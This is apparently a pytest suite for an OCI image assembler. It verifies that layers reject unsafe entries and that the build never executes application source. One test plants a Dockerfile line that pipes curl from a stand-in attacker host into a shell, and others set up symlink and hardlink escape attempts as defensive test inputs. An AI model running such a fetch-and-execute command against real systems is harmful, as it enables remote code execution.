"""覆盖 AC: AC-15、AC-16、AC-25、AC-27、AC-28、AC-42、AC-54."""

import json
import os
import tarfile
from types import SimpleNamespace

import pytest

from runtime_manager.executors.protocol import ExecutorError
from tests.test_kubernetes_executor import runtime as runtime

IMAGE = "registry.example/python@sha256:" + "a" * 64


@pytest.fixture
def tree(tmp_path):
    source, environment = tmp_path / "source", tmp_path / "environment"
    source.mkdir()
    environment.mkdir()
    (source / "main.py").write_text("print('app')")
    (source / "Procfile").write_text("web: python main.py\n")
    (environment / "bin").mkdir()
    (environment / "bin/python").symlink_to("/usr/local/bin/python3.11")
    return source, environment, tmp_path


def document():
    return {
        "platform": "linux/amd64",
        "runtime": "python3.11",
        "port": 8080,
        "profile": {"runtime_image": IMAGE, "uid": 10001, "gid": 10001},
        "startup": {"command": []},
    }


def test_layer_contains_only_fixed_layout_with_platform_entrypoint(tree):
    from runtime_manager.oci_assembler import write_layer

    source, environment, root = tree
    (source / "Dockerfile").write_text("RUN curl attacker.example/execute | sh")
    target = root / "layer.tar"
    write_layer(document(), source, environment, target)
    with tarfile.open(target) as archive:
        names = archive.getnames()
        assert "app/main.py" in names and "opt/venv/bin/python" in names
        assert not any(n.startswith("run/") or n.startswith("etc/passwd") for n in names)
        assert archive.getmember("opt/venv/bin/python").linkname == "/usr/local/bin/python3.11"
        entry = archive.extractfile("usr/local/bin/bisheng-app-entrypoint").read()
        assert b"UVICORN_ROOT_PATH" in entry and b"exec" in entry
        assert all(item.uid == item.gid == 10001 for item in archive.getmembers())


@pytest.mark.parametrize("attack", ["link", "whiteout", "setuid", "fifo", "external-hardlink"])
def test_unsafe_application_entries_are_rejected(tree, attack):
    from runtime_manager.oci_assembler import write_layer

    source, environment, root = tree
    if attack == "link":
        (source / "escape").symlink_to("/run/registry/config.json")
    elif attack == "whiteout":
        (source / ".wh.etc").write_text("")
    elif attack == "setuid":
        (source / "main.py").chmod(0o4755)
    elif attack == "fifo":
        os.mkfifo(source / "pipe")
    else:
        (root / "private").write_text("private")
        os.link(root / "private", source / "hardlink")
    with pytest.raises(ExecutorError):
        write_layer(document(), source, environment, root / "layer.tar")


def test_crane_only_mutates_frozen_base_and_never_runs_source(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree
    seen = []

    def run(args, **kwargs):
        seen.append(args)
        if "config" in args:
            return SimpleNamespace(stdout=json.dumps({"os": "linux", "architecture": "amd64"}), returncode=0)
        assert "mutate" in args and "--append" in args and "--entrypoint" in args
        assert "RUN" not in " ".join(args) and "docker" not in args
        return SimpleNamespace(stdout="registry.example/apps@sha256:" + "b" * 64 + "\n", returncode=0)

    result = assemble_image(document(), source, environment, "registry.example/apps:operation", work=root, run=run)
    assert result["image_ref"].endswith("@sha256:" + "b" * 64)
    assert result["mode"] == "source-image" and result["startup"] == {}
    assert seen[0][-1] == IMAGE


def test_wrong_base_architecture_and_missing_registry_are_explicit(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree

    def run(*args, **kwargs):
        return SimpleNamespace(stdout=json.dumps({"os": "linux", "architecture": "arm64"}), returncode=0)

    with pytest.raises(ExecutorError, match="platform"):
        assemble_image(document(), source, environment, "registry.example/apps:operation", work=root, run=run)
    with pytest.raises(ExecutorError, match="registry"):
        assemble_image(document(), source, environment, "", work=root, run=run)


def test_registry_secret_is_only_on_the_trusted_assembler(runtime):
    from runtime_manager.oci_assembler import KubernetesAssembler

    executor, _platform, _cluster, operation, _, _ = runtime
    operation.update(kind="prepare", stage="preparing")
    operation["payload"]["profile"] = operation["payload"]["resolved_delivery"]["profile"]
    executor.document.update(
        assembler_image=IMAGE, image_repository="registry.example/apps", registry_secret="runtime-registry-auth"
    )
    seen = []

    def phase(op, stage, purpose, document, **kwargs):
        from runtime_manager.k8s_templates import pod_template

        seen.append(pod_template(kwargs["plan"]))
        return {"mode": "source-image", "image_ref": IMAGE}

    executor._phase = phase
    result = KubernetesAssembler(executor).prepare(operation, {"mode": "bundle"})
    assert result["mode"] == "source-image"
    pod = seen[0]
    container = pod["spec"]["containers"][0]
    assert container["name"] == "assembler"
    assert any(v["name"] == "registry-auth" for v in container["volumeMounts"])
    assert not any(v["name"] == "material-auth" for v in pod["spec"]["volumes"])


def test_venv_relative_python_links_still_resolve_only_to_the_frozen_interpreter(tree):
    from runtime_manager.oci_assembler import write_layer

    source, environment, root = tree
    (environment / "bin/python3").symlink_to("python")
    write_layer(document(), source, environment, root / "layer.tar")
    (environment / "bin/python").unlink()
    (environment / "bin/python").symlink_to("/run/registry/config.json")
    with pytest.raises(ExecutorError, match="link"):
        write_layer(document(), source, environment, root / "other.tar")
